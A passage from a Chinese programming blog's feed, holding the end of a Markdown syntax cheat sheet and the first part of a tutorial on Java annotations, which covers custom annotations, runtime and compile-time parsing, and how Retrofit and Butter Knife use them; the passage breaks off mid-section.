<h1 id="u6709_u5E8F_u5217_u8868"><a href="#u6709_u5E8F_u5217_u8868" class="headerlink" title="有序列表"></a>有序列表</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 有序列表</span><br><span class="line"><span class="number">2.</span> 有序列表</span><br><span class="line"><span class="number">3.</span> 有序列表</span><br><span class="line"><span class="number">4.</span> 有序列表</span><br></pre></td></tr></table></figure>
<ol>
<li>有序列表</li>
<li>有序列表</li>
<li>有序列表</li>
<li>有序列表</li>
</ol>
<h1 id="u5D4C_u5957_u5217_u8868"><a href="#u5D4C_u5957_u5217_u8868" class="headerlink" title="嵌套列表"></a>嵌套列表</h1><p>+*-可循环使用，但符号之后的空格不能少，次级列表中符号之前的空格也不能少</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby"> 嵌套列表</span><br><span class="line"></span> + 嵌套列表</span><br><span class="line"> + 嵌套列表</span><br><span class="line">  -<span class="ruby"> 嵌套列表</span><br><span class="line"></span>   * 嵌套列表</span><br><span class="line">-<span class="ruby"> 嵌套列表</span></span><br></pre></td></tr></table></figure>
<ul>
<li>嵌套列表<ul>
<li>嵌套列表</li>
<li>嵌套列表</li>
</ul>
<ul>
<li>嵌套列表<ul>
<li>嵌套列表</li>
</ul>
</li>
</ul>
</li>
<li>嵌套列表</li>
</ul>
<h1 id="u6587_u5B57_u8D85_u94FE_uFF1AInline_u65B9_u5F0F"><a href="#u6587_u5B57_u8D85_u94FE_uFF1AInline_u65B9_u5F0F" class="headerlink" title="文字超链：Inline方式"></a>文字超链：Inline方式</h1><p>Tooltips可省略</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="collection">[]</span><span class="list">(<span class="keyword">http://blog.xuanzhangjiong.xyz</span>)</span></span><br></pre></td></tr></table></figure>
<p><a href="http://blog.xuanzhangjiong.xyz" target="_blank" rel="external"></a></p>
<h1 id="u56FE_u7247_u8D85_u94FE"><a href="#u56FE_u7247_u8D85_u94FE" class="headerlink" title="图片超链"></a>图片超链</h1><p>多个感叹号，Tooltips可省略，要设置大小只能借助HTML标记</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="link_label">GitHub Mark</span>](<span class="link_url">http://github.global.ssl.fastly.net/images/modules/logos_page/GitHub-Mark.png "GitHub Mark"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://github.global.ssl.fastly.net/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Mark" title="GitHub Mark"></p>
<h1 id="u7D22_u5F15_u8D85_u94FE_uFF1AReference_u65B9_u5F0F"><a href="#u7D22_u5F15_u8D85_u94FE_uFF1AReference_u65B9_u5F0F" class="headerlink" title="索引超链：Reference方式"></a>索引超链：Reference方式</h1><p>索引，1 2可以是任意字符</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="link_label">Stepway's Notes</span>][<span class="link_reference">1</span>]</span><br><span class="line">![<span class="link_label">GitHub Octocat</span>][<span class="link_reference">2</span>]</span><br><span class="line">[<span class="link_reference">1</span>]:<span class="link_url">http://blog.xuanzhangjiong.xyz</span></span><br><span class="line">[<span class="link_reference">2</span>]:<span class="link_url">http://github.global.ssl.fastly.net/images/modules/logos_page/Octocat.png</span></span><br></pre></td></tr></table></figure>
<p><a href="http://blog.xuanzhangjiong.xyz" target="_blank" rel="external">TopJohn’s Blog</a><br><img src="http://github.global.ssl.fastly.net/images/modules/logos_page/Octocat.png" alt="GitHub Octocat"></p>
<h1 id="u81EA_u52A8_u94FE_u63A5"><a href="#u81EA_u52A8_u94FE_u63A5" class="headerlink" title="自动链接"></a>自动链接</h1><p>尖括号</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">http:</span><span class="comment">//blog.xuanzhangjiong.xyz&gt;</span></span><br><span class="line">&lt;<span class="string">http:</span><span class="comment">//TopJohn.github.io&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="u4EE3_u7801"><a href="#u4EE3_u7801" class="headerlink" title="代码"></a>代码</h1><p>行内代码 使用符号`</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="escape">`v</span>al s = <span class="string">"hello Markdown"</span><span class="escape">`</span><br><span class="line"></span><span class="escape">``</span>val s = <span class="string">"hello Markdown"</span> 需要显示(<span class="escape">`)</span><span class="escape">``</span></span><br></pre></td></tr></table></figure>
<p><code>val s = &quot;hello Markdown&quot;</code><br><code>val s = &quot;hello Markdown&quot; 需要显示(`)</code></p>
<h1 id="u6BB5_u843D_u4EE3_u7801"><a href="#u6BB5_u843D_u4EE3_u7801" class="headerlink" title="段落代码"></a>段落代码</h1><p>每行文字前加4个空格或者1个Tab，并用空行开始</p>
<p>这是一个普通段落：<br>    这是一个代码区块。<br>    这是一个代码区块。</p>
<h1 id="hexo_u4EE3_u7801"><a href="#hexo_u4EE3_u7801" class="headerlink" title="hexo代码"></a>hexo代码</h1><p>可指定编程语言，{ % % }代表左右大括号</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock [title] [lang:php] [url] [link text]%&#125;</span><br><span class="line">  <span class="variable">$word</span> = <span class="string">'hello'</span></span><br><span class="line">  echo <span class="variable">$word</span>;</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><figcaption><span>php</span><a href="http://blog.xuanzhangjiong.xyz" target="_blank" rel="external">link php</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$word</span> = <span class="string">'hello'</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$word</span>;</span><br></pre></td></tr></table></figure>
<h1 id="u6CE8_u91CA"><a href="#u6CE8_u91CA" class="headerlink" title="注释"></a>注释</h1><p>用html的注释<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 对当前编辑文件(.md)的注释 --&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="u8F6C_u4E49_u5B57_u7B26"><a href="#u8F6C_u4E49_u5B57_u7B26" class="headerlink" title="转义字符"></a>转义字符</h1><p>Markdown中的转义字符为\，转义的有：<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="command">\\</span> 反斜杠</span><br><span class="line"><span class="command">\`</span> 反引号</span><br><span class="line"><span class="command">\*</span> 星号</span><br><span class="line"><span class="command">\_</span> 下划线</span><br><span class="line"><span class="command">\&#123;</span><span class="command">\&#125;</span> 大括号</span><br><span class="line"><span class="command">\[</span><span class="command">\]</span> 中括号</span><br><span class="line"><span class="command">\(</span><span class="command">\)</span> 小括号</span><br><span class="line"><span class="command">\#</span> 井号</span><br><span class="line"><span class="command">\+</span> 加号</span><br><span class="line"><span class="command">\-</span> 减号</span><br><span class="line"><span class="command">\.</span> 英文句号</span><br><span class="line"><span class="command">\!</span> 感叹号</span><br></pre></td></tr></table></figure></p>
<h1 id="u5176_u5B83"><a href="#u5176_u5B83" class="headerlink" title="其它"></a>其它</h1><p>文本中可直接用html标签，但是要前后加上空行。<br><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="keyword">type</span>=<span class="string">'text</span>'&gt;</span><br></pre></td></tr></table></figure></p>
<input type="text">

<h1 id="one_more_thing_uFF1A_u8868_u683C"><a href="#one_more_thing_uFF1A_u8868_u683C" class="headerlink" title="one more thing：表格"></a>one more thing：表格</h1><p>Markdown的扩展语法，hexo不支持<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> Tables        </span>|<span class="string"> Are           </span>|<span class="string"> Cool  </span>|</span><br><span class="line">|<span class="string"> ------------- </span>|<span class="string">:-------------:</span>|<span class="string"> -----:</span>|</span><br><span class="line">|<span class="string"> col 3 is      </span>|<span class="string"> right-aligned </span>|<span class="string"> $1600 </span>|</span><br><span class="line">|<span class="string"> col 2 is      </span>|<span class="string"> centered      </span>|<span class="string">   $12 </span>|</span><br><span class="line">|<span class="string"> zebra stripes </span>|<span class="string"> are neat      </span>|<span class="string">    $1 </span>|</span><br></pre></td></tr></table></figure></p>
<table>
<thead>
<tr>
<th>Tables</th>
<th style="text-align:center">Are</th>
<th style="text-align:right">Cool</th>
</tr>
</thead>
<tbody>
<tr>
<td>col 3 is</td>
<td style="text-align:center">right-aligned</td>
<td style="text-align:right">$1600</td>
</tr>
<tr>
<td>col 2 is</td>
<td style="text-align:center">centered</td>
<td style="text-align:right">$12</td>
</tr>
<tr>
<td>zebra stripes</td>
<td style="text-align:center">are neat</td>
<td style="text-align:right">$1</td>
</tr>
</tbody>
</table>
<h1 id="u53C2_u8003_u6587_u732E"><a href="#u53C2_u8003_u6587_u732E" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="http://ibruce.info/2013/11/26/markdown/" target="_blank" rel="external">Markdown简明语法</a></li>
<li><a href="http://www.appinn.com/markdown/" target="_blank" rel="external">Markdown语法说明</a></li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[MarkDown语法现在越来越常见了，Github的Readme，SegmentFault、Coding、OSChina、简书都要用...]]>
    
    </summary>
    
      <category term="码农必备常识" scheme="http://www.xuanzhangjiong.xyz/tags/%E7%A0%81%E5%86%9C%E5%BF%85%E5%A4%87%E5%B8%B8%E8%AF%86/"/>
    
      <category term="MarkDown" scheme="http://www.xuanzhangjiong.xyz/categories/MarkDown/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java-注解浅析]]></title>
    <link href="http://www.xuanzhangjiong.xyz/2015/09/10/Java-%E6%B3%A8%E8%A7%A3%E6%B5%85%E6%9E%90/"/>
    <id>http://www.xuanzhangjiong.xyz/2015/09/10/Java-注解浅析/</id>
    <published>2015-09-10T07:18:03.000Z</published>
    <updated>2015-12-21T08:46:32.000Z</updated>
    <content type="html"><![CDATA[<p>有很多开源的库都利用注解来简化代码提升开发效率。</p>
<p>下面，我就来谈谈我学习Java注解的一点点看法。</p>
<p>本文简单介绍下 Annotation 示例、概念及作用、分类、自定义、解析，并对几个 Android 开源库 Annotation 原理进行简析。</p>
<h1 id="1-Annotation_u793A_u4F8B"><a href="#1-Annotation_u793A_u4F8B" class="headerlink" title="1.Annotation示例"></a>1.Annotation示例</h1><p>Override Annotation</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>;</span><br></pre></td></tr></table></figure>
<p>Retrofit Annotation</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@GET</span>(<span class="string">"/users/&#123;username&#125;"</span>)</span><br><span class="line">User <span class="function">getUser</span>(<span class="variable">@Path</span>(<span class="string">"username"</span>) String username);</span><br></pre></td></tr></table></figure>
<p>Butter Knife Annotation</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="at_rule">@<span class="keyword">InjectView(R.id.user)</span> EditText username</span>;</span><br></pre></td></tr></table></figure>
<p>ActiveAndroid Annotation</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Column(<span class="keyword">name</span> = “<span class="keyword">Name</span><span class="string">") public String name;</span></span><br></pre></td></tr></table></figure>
<p>Retrofit 为符合 RESTful 规范的网络请求框架<br>Butter Knife 为 View 及事件等依赖注入框架<br>Active Android 为 ORM 框架</p>
<h1 id="2-_Annotation__u6982_u5FF5_u53CA_u4F5C_u7528"><a href="#2-_Annotation__u6982_u5FF5_u53CA_u4F5C_u7528" class="headerlink" title="2. Annotation 概念及作用"></a>2. Annotation 概念及作用</h1><blockquote>
<p>An annotation is a form of metadata, that can be added to Java source code. Classes, methods, variables, parameters and packages may be annotated. Annotations have no direct effect on the operation of the code they annotate.</p>
</blockquote>
<p>能够添加到Java源代码的语法元数据。类、方法、变量、参数、包都可以被注解，可用来将信息元数据与程序元素进行关联。Annotation 中文常译为“注解”。</p>
<h2 id="2-2__u4F5C_u7528"><a href="#2-2__u4F5C_u7528" class="headerlink" title="2.2 作用"></a>2.2 作用</h2><p>a. 标记，用于告诉编译器一些信息<br>b. 编译时动态处理，如动态生成代码<br>c. 运行时动态处理，如得到注解信息<br>这里的三个作用实际对应着后面自定义 Annotation 时说的 @Retention 三种值分别表示的 Annotation</p>
<h1 id="3-_Annotation__u5206_u7C7B"><a href="#3-_Annotation__u5206_u7C7B" class="headerlink" title="3. Annotation 分类"></a>3. Annotation 分类</h1><h2 id="3-1__u6807_u51C6_Annotation_uFF0COverride_2C_Deprecated_2C_SuppressWarnings"><a href="#3-1__u6807_u51C6_Annotation_uFF0COverride_2C_Deprecated_2C_SuppressWarnings" class="headerlink" title="3.1 标准 Annotation，Override, Deprecated, SuppressWarnings"></a>3.1 标准 Annotation，Override, Deprecated, SuppressWarnings</h2><p>标准 Annotation 是指 Java 自带的几个 Annotation，上面三个分别表示重写函数，不鼓励使用(有更好方式、使用有风险或已不在维护)，忽略某项 Warning</p>
<h2 id="3-2__u5143_Annotation_uFF0C@Retention_2C_@Target_2C_@Inherited_2C_@Documented"><a href="#3-2__u5143_Annotation_uFF0C@Retention_2C_@Target_2C_@Inherited_2C_@Documented" class="headerlink" title="3.2 元 Annotation，@Retention, @Target, @Inherited, @Documented"></a>3.2 元 Annotation，@Retention, @Target, @Inherited, @Documented</h2><p>元 Annotation 是指用来定义 Annotation 的 Annotation，在后面 Annotation 自定义部分会详细介绍含义</p>
<h2 id="3-3__u81EA_u5B9A_u4E49_Annotation"><a href="#3-3__u81EA_u5B9A_u4E49_Annotation" class="headerlink" title="3.3 自定义 Annotation"></a>3.3 自定义 Annotation</h2><p>自定义 Annotation 表示自己根据需要定义的 Annotation，定义时需要用到上面的元 Annotation<br>这里是一种分类而已，也可以根据作用域分为源码时、编译时、运行时 Annotation，后面在自定义 Annotation 时会具体介绍</p>
<h1 id="4-_Annotation__u81EA_u5B9A_u4E49"><a href="#4-_Annotation__u81EA_u5B9A_u4E49" class="headerlink" title="4. Annotation 自定义"></a>4. Annotation 自定义</h1><h2 id="4-1__u8C03_u7528"><a href="#4-1__u8C03_u7528" class="headerlink" title="4.1 调用"></a>4.1 调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@MethodInfo</span>(</span><br><span class="line">        author = “trinea.cn+android<span class="annotation">@gmail</span>.com”,</span><br><span class="line">        date = <span class="string">"2014/02/14"</span>,</span><br><span class="line">        version = <span class="number">2</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAppName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"trinea"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是调用自定义 Annotation——MethodInfo 的示例。<br>MethodInfo Annotation 作用为给方法添加相关信息，包括 author、date、version。</p>
<h2 id="4-2__u5B9A_u4E49"><a href="#4-2__u5B9A_u4E49" class="headerlink" title="4.2 定义"></a>4.2 定义</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Documented</span></span><br><span class="line"><span class="annotation">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="annotation">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="annotation">@Inherited</span></span><br><span class="line"><span class="keyword">public</span> <span class="annotation">@interface</span> MethodInfo &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">author</span><span class="params">()</span> <span class="keyword">default</span> "trinea@gmail.com"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">date</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">version</span><span class="params">()</span> <span class="keyword">default</span> 1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是 MethodInfo 的实现部分<br>(1). 通过 @interface 定义，注解名即为自定义注解名<br>(2). 注解配置参数名为注解类的方法名，且：<br>a. 所有方法没有方法体，没有参数没有修饰符，实际只允许 public &amp; abstract 修饰符，默认为 public，不允许抛异常<br>b. 方法返回值只能是基本类型，String, Class, annotation, enumeration 或者是他们的一维数组<br>c. 若只有一个默认属性，可直接用 value() 函数。一个属性都没有表示该 Annotation 为 Mark Annotation<br>(3). 可以加 default 表示默认值</p>
<h2 id="4-3__u5143_Annotation"><a href="#4-3__u5143_Annotation" class="headerlink" title="4.3 元 Annotation"></a>4.3 元 Annotation</h2><p>@Documented 是否会保存到 Javadoc 文档中<br>@Retention 保留时间，可选值 SOURCE（源码时），CLASS（编译时），RUNTIME（运行时），默认为 CLASS，SOURCE 大都为 Mark Annotation，这类 Annotation 大都用来校验，比如 Override, SuppressWarnings<br>@Target 可以用来修饰哪些程序元素，如 TYPE, METHOD, CONSTRUCTOR, FIELD, PARAMETER 等，未标注则表示可修饰所有<br>@Inherited 是否可以被继承，默认为 false</p>
<h1 id="5-_Annotation__u89E3_u6790"><a href="#5-_Annotation__u89E3_u6790" class="headerlink" title="5. Annotation 解析"></a>5. Annotation 解析</h1><h2 id="5-1__u8FD0_u884C_u65F6_Annotation__u89E3_u6790"><a href="#5-1__u8FD0_u884C_u65F6_Annotation__u89E3_u6790" class="headerlink" title="5.1 运行时 Annotation 解析"></a>5.1 运行时 Annotation 解析</h2><p>(1) 运行时 Annotation 指 @Retention 为 RUNTIME 的 Annotation，可手动调用下面常用 API 解析</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">method</span>.<span class="title">getAnnotation</span><span class="params">(AnnotationName.<span class="keyword">class</span>)</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">method</span>.<span class="title">getAnnotations</span><span class="params">()</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">method</span>.<span class="title">isAnnotationPresent</span><span class="params">(AnnotationName.<span class="keyword">class</span>)</span>;</span></span><br></pre></td></tr></table></figure>
<p>其他 @Target 如 Field，Class 方法类似<br>getAnnotation(AnnotationName.class) 表示得到该 Target 某个 Annotation 的信息，因为一个 Target 可以被多个 Annotation 修饰<br>getAnnotations() 则表示得到该 Target 所有 Annotation<br>isAnnotationPresent(AnnotationName.class) 表示该 Target 是否被某个 Annotation 修饰</p>
<p>(2) 解析示例如下：</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="type">void</span> main(<span class="type">String</span>[] args) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> cls = <span class="type">Class</span>.forName(<span class="string">"cn.trinea.java.test.annotation.App"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Method</span> <span class="keyword">method</span> : cls.getMethods()) &#123;</span><br><span class="line">            <span class="type">MethodInfo</span> methodInfo = <span class="keyword">method</span>.getAnnotation(</span><br><span class="line"><span class="type">MethodInfo</span>.class);</span><br><span class="line">            <span class="keyword">if</span> (methodInfo != null) &#123;</span><br><span class="line">                <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"method name:"</span> + <span class="keyword">method</span>.getName());</span><br><span class="line">                <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"method author:"</span> + methodInfo.author());</span><br><span class="line">                <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"method version:"</span> + methodInfo.version());</span><br><span class="line">                <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"method date:"</span> + methodInfo.date());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (<span class="type">ClassNotFoundException</span> e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以之前自定义的 MethodInfo 为例，利用 Target（这里是 Method）getAnnotation 函数得到 Annotation 信息，然后就可以调用 Annotation 的方法得到响应属性值</p>
<h2 id="5-2__u7F16_u8BD1_u65F6_Annotation__u89E3_u6790"><a href="#5-2__u7F16_u8BD1_u65F6_Annotation__u89E3_u6790" class="headerlink" title="5.2 编译时 Annotation 解析"></a>5.2 编译时 Annotation 解析</h2><p>(1) 编译时 Annotation 指 @Retention 为 CLASS 的 Annotation，甴编译器自动解析。需要做的<br>a. 自定义类集成自 AbstractProcessor<br>b. 重写其中的 process 函数<br>这块很多同学不理解，实际是编译器在编译时自动查找所有继承自 AbstractProcessor 的类，然后调用他们的 process 方法去处理</p>
<p>(2) 假设 MethodInfo 的 @Retention 为 CLASS，解析示例如下：<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@SupportedAnnotationTypes</span>(&#123; <span class="string">"cn.trinea.java.test.annotation.MethodInfo"</span> &#125;)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">MethodInfoProcessor</span> <span class="keyword"><span class="keyword">extends</span></span> <span class="title">AbstractProcessor</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="annotation">@Override</span></span><br><span class="line">    public boolean process(<span class="type">Set</span>&lt;? <span class="keyword">extends</span> <span class="type">TypeElement</span>&gt; annotations, <span class="type">RoundEnvironment</span> env) &#123;</span><br><span class="line">        <span class="type">HashMap</span>&lt;<span class="type">String</span>, <span class="type">String</span>&gt; map = <span class="keyword">new</span> <span class="type">HashMap</span>&lt;<span class="type">String</span>, <span class="type">String</span>&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">TypeElement</span> te : annotations) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">Element</span> element : env.getElementsAnnotatedWith(te)) &#123;</span><br><span class="line">                <span class="type">MethodInfo</span> methodInfo = element.getAnnotation(<span class="type">MethodInfo</span>.<span class="keyword">class</span>);</span><br><span class="line">                map.put(element.getEnclosingElement().toString(), methodInfo.author());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>SupportedAnnotationTypes 表示这个 Processor 要处理的 Annotation 名字。<br>process 函数中参数 annotations 表示待处理的 Annotations，参数 env 表示当前或是之前的运行环境<br>process 函数返回值表示这组 annotations 是否被这个 Processor 接受，如果接受后续子的 rocessor 不会再对这个 Annotations 进行处理</p>
<h1 id="6-__u51E0_u4E2A_Android__u5F00_u6E90_u5E93_Annotation__u539F_u7406_u7B80_u6790"><a href="#6-__u51E0_u4E2A_Android__u5F00_u6E90_u5E93_Annotation__u539F_u7406_u7B80_u6790" class="headerlink" title="6. 几个 Android 开源库 Annotation 原理简析"></a>6. 几个 Android 开源库 Annotation 原理简析</h1><h2 id="6-1_Annotation__u2014_Retrofit"><a href="#6-1_Annotation__u2014_Retrofit" class="headerlink" title="6.1 Annotation — Retrofit"></a>6.1 Annotation — Retrofit</h2><p>(1) 调用<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@GET</span>(<span class="string">"/users/&#123;username&#125;"</span>)</span><br><span class="line">User <span class="function">getUser</span>(<span class="variable">@Path</span>(<span class="string">"username"</span>) String username);</span><br></pre></td></tr></table></figure></p>
<p>(2) 定义<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Documented</span><br><span class="line">@Target(<span class="function"><span class="keyword">METHOD</span>)</span><br><span class="line">@<span class="title">Retention</span><span class="params">(RUNTIME)</span></span><br><span class="line">@<span class="title">RestMethod</span><span class="params">("GET")</span></span><br><span class="line"><span class="title">public</span> @<span class="title">interface</span> <span class="title">GET</span> <span class="comment">&#123;</span><br><span class="line">  String value();</span><br><span class="line">&#125;</span></span></span><br></pre></td></tr></table></figure></p>
<p>从定义可看出 Retrofit 的 Get Annotation 是运行时 Annotation，并且只能用于修饰 Method</p>
<p>(3) 原理</p>
<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private <span class="type">void</span> parseMethodAnnotations() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">Annotation</span> methodAnnotation : <span class="keyword">method</span>.getAnnotations()) &#123;</span><br><span class="line">    <span class="type">Class</span>&lt;? extends <span class="type">Annotation</span>&gt; annotationType = methodAnnotation.annotationType();</span><br><span class="line">    <span class="type">RestMethod</span> methodInfo = null;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">Annotation</span> innerAnnotation : annotationType.getAnnotations()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="type">RestMethod</span>.class == innerAnnotation.annotationType()) &#123;</span><br><span class="line">            methodInfo = (<span class="type">RestMethod</span>) innerAnnotation;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ……</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RestMethodInfo.java 的 parseMethodAnnotations 方法如上，会检查每个方法的每个 Annotation， 看是否被 RestMethod 这个 Annotation 修饰的 Annotation 修饰，这个有点绕，就是是否被 GET、DELETE、POST、PUT、HEAD、PATCH 这些 Annotation 修饰，然后得到 Annotation 信息，在对接口进行动态代理时会掉用到这些 Annotation 信息从而完成调用。</p>
<h2 id="6-2_Annotation__u2014_Butter_Knife"><a href="#6-2_Annotation__u2014_Butter_Knife" class="headerlink" title="6.2 Annotation — Butter Knife"></a>6.2 Annotation — Butter Knife</h2><p>(1) 调用</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="at_rule">@<span class="keyword">InjectView(R.id.user)</span></span><br><span class="line">EditText username</span>;</span><br></pre></td></tr></table></figure>
<p>(2) 定义</p>
